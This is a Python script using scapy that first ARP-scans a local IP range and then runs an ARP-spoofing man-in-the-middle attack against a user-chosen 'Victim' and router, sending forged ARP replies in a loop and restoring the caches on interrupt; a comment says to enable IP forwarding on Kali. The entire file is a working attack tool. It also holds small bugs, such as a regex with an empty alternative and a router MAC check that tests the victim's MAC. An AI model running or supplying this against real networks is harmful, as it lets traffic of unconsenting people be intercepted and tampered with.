from scapy.all import *
import re
from scapy.layers.l2 import Ether, ARP
import time


def NetworkScanner(IPRange):
    cleaner = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$||^\d{1,3}\.\d{1,3}\.\d{1,3}\.0\\([1-9]|1[0-9]|2[0-4])$"
    # Maybe need to make this Regex more Powerful
    ipCheck = re.match(cleaner, IPRange)
    if ipCheck and not ipCheck.group().find(""):
        arpOptions = ARP(pdst=IPRange)
        arpPacket = etherHeader / arpOptions
        results, nonResult = srp(arpPacket, timeout=2)
        return results
    else:
        print("[-] Please Enter Valid IP(s) ...")


def PrintResult(results):
    if len(results) > 0:
        print("[+] Live PCs\n****************")
        for sendResult, receive in results:
            print(receive[Ether].psrc, "  is at ", receive[Ether].hwsrc)
    else:
        print("[+] No Live PCs ...")


def sendingPackets(Victim_IP, Victim_MAC, Router_IP, Router_MAC):
    # Fake Packets for each Victim and Router
    ARP_replay_victim = ARP(op=2, pdst=Victim_IP, psrc=Router_IP, hwdst=Victim_MAC)
    ARP_replay_Router = ARP(op=2, pdst=Router_IP, psrc=Victim_IP, hwdst=Router_MAC)

    # Real Packets to reset the connection before interrupt code
    ARP_replay_Restart_V = ARP(op=2, pdst=Victim_IP, psrc=Router_IP, hwdst=Victim_MAC, hwsrc=Router_MAC)
    ARP_replay_Restart_R = ARP(op=2, pdst=Router_IP, psrc=Victim_IP, hwdst=Router_MAC, hwsrc=Victim_MAC)

    # important to run this command to forward packet from middle to each dis:
    # this run Kali linux
    # sudo sysctl -w net.ipv4.ip_forward=1
    try:
        while True:
            # Send Fake Packets
            send(ARP_replay_victim)
            send(ARP_replay_Router)
            time.sleep(10)
    except KeyboardInterrupt as err:
        print("[-] Connection reset ...")
        send(ARP_replay_Restart_V)
        send(ARP_replay_Restart_R)
        print("[-] Attack Exit")


def MITMAttack(Victim_IP, Victim_MAC, Router_IP, Router_MAC):
    IPCleaner = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    MACCleaner = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    ipCheck_V = re.match(IPCleaner, Victim_IP)
    MACCheck_V = re.match(MACCleaner, Victim_MAC)
    ipCheck_R = re.match(IPCleaner, Router_IP)
    MACCheck_R = re.match(MACCleaner, Victim_MAC)
    if ipCheck_V and ipCheck_R and MACCheck_V and MACCheck_R:
        sendingPackets(Victim_IP, Victim_MAC, Router_IP, Router_MAC)
    else:
        print("[-] Please, Enter Valid Info ...")


if __name__ == '__main__':
    etherHeader = Ether(dst="FF:FF:FF:FF:FF:FF")
    ipRange = input("[+] Enter Ur IP(s)> ")
    result = NetworkScanner(ipRange)
    PrintResult(result)
    choose = int(input("[+] Do you want MITM Aplay ? (yes:1 or no:0)> "))
    if choose == int(1):
        VictimIP = input("[+] Enter Victim IP > ")
        RouterIP = input("[+] Enter Router IP > ")
        VictimMAC = input("[+] Enter Victim MAC > ")
        RouterMAC = input("[+] Enter Router MAC > ")
        MITMAttack(VictimIP, VictimMAC, RouterIP, RouterMAC)
    elif choose == int(0):
        print("[-] Exit")
    else:
        print("[-] Please, Enter Valid option ...")

    
